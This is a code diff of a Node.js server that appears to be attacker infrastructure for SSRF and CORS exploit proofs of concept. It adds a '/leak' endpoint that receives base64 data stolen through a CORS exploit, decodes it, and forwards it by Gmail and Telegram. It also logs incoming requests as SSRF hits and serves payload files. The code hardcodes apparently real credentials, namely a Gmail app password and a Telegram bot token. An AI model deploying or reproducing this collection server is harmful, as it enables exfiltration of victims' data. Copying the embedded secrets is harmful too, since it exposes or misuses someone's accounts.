@@ -6,7 +6,6 @@ const fetch = require('node-fetch');
 
 // === CONFIGURATION ===
 
-// Gmail setup
 const gmailUser = 'mzeroaccess@gmail.com';
 const gmailPass = 'pext txcx xmsv ytbd';
 
@@ -18,7 +17,6 @@ const transporter = nodemailer.createTransport({
     }
 });
 
-// Telegram setup
 const telegramBotToken = '7610095737:AAFDUe27WjrY3FJKxHCX5F2Tihd-6YP08sA';
 const telegramChatId = '599961631';
 
@@ -58,7 +56,7 @@ const server = http.createServer((req, res) => {
         req.headers['x-real-ip'],
         req.socket.remoteAddress
     ].filter(Boolean);
-    
+
     console.log(`➡️  IP Chain: ${ipChain.join(' → ')}`);
     console.log(`➡️  URL: ${req.url}`);
     console.log(`🧠 Headers:`, req.headers);
@@ -75,38 +73,69 @@ const server = http.createServer((req, res) => {
                 console.log(`📦 JSON Body:\n${parsedBody}`);
             } catch (err) {
                 console.error('❌ Error parsing JSON body:', err.message);
-                parsedBody = rawBody; // fallback
+                parsedBody = rawBody;
             }
         } else {
             console.log(`📦 Body:\n${rawBody}`);
         }
 
+        // === CORS PoC leak handling ===
+        if (req.url === '/leak' && req.method === 'POST') {
+            let data = null;
+
+            try {
+                const jsonBody = JSON.parse(rawBody);
+                data = jsonBody.data;
+            } catch (err) {
+                console.error("❌ Couldn't parse CORS exfiltrated JSON:", err);
+            }
+
+            if (data) {
+                const decoded = Buffer.from(data, 'base64').toString('utf-8');
+                console.log("🔥 CORS Exfiltrated Data:\n", decoded);
+
+                const leakDetails = `🧠 CORS Exploit Exfiltrated Data:\n\n${decoded}`;
+
+                transporter.sendMail({
+                    from: gmailUser,
+                    to: gmailUser,
+                    subject: '🔥 CORS PoC Triggered!',
+                    text: leakDetails
+                }, (error, info) => {
+                    if (error) console.error('❌ Error sending CORS email:', error);
+                    else console.log('✅ CORS mail sent:', info.response);
+                });
+
+                sendTelegramMessage(leakDetails);
+            }
+
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end("✅ CORS data received.");
+            return;
+        }
+
+        // === Normal Request Logging and Alerts ===
         const fullRequestDetails = `⚡ New Request at ${now}!\n\n` +
             `➡️ IP Chain: ${ipChain.join(' → ')}\n` +
             `➡️ URL: ${req.url}\n\n` +
             `🧠 Headers:\n${JSON.stringify(req.headers, null, 2)}\n\n` +
             `📦 Body:\n${parsedBody || 'No Body'}`;
 
-        // Send Email
-        const mailOptions = {
+        transporter.sendMail({
             from: gmailUser,
             to: gmailUser,
             subject: '⚡ SSRF Request Detected!',
             text: fullRequestDetails
-        };
-
-        transporter.sendMail(mailOptions, (error, info) => {
+        }, (error, info) => {
             if (error) console.error('❌ Error sending mail:', error);
             else console.log('✅ Mail sent:', info.response);
         });
 
-        // Send Telegram Alert
         sendTelegramMessage(fullRequestDetails);
 
-        // Set CORS header
+        // Serve payloads if exists
         res.setHeader('Access-Control-Allow-Origin', '*');
 
-        // Serve payloads if exists
         const safePath = path.normalize(path.join(__dirname, 'public', req.url));
         if (safePath.startsWith(path.join(__dirname, 'public')) && req.url.startsWith('/payload/')) {
             fs.readFile(safePath, (err, content) => {
@@ -124,7 +153,6 @@ const server = http.createServer((req, res) => {
         }
     });
 });
-
 
 const PORT = 4545;
 server.listen(PORT, () => {
